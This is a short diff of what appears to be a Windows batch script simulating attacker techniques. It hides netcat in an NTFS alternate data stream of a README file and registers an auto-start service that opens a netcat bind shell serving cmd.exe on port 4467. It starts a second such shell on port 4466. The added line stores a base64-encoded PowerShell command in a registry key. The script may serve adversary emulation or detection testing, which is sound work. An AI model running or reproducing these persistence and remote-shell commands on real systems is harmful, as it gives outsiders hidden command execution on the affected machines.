@@ -15,6 +15,8 @@ type %Temp%\nc.txt > %Temp%\README.txt:hid.txt
 
 sc create XSample binPath= "cmd.exe /C %Temp%\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample
 
+reg.exe add "HKEY_CURRENT_USER\Software\Classes\XSample" /v XXX /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2Nucm1hcmsudHh0IiAtdmFsdWUgInRhcmdldCI="
+
 start calc
 %Temp%\nc64.exe -nLvp 4466 -e cmd.exe
 
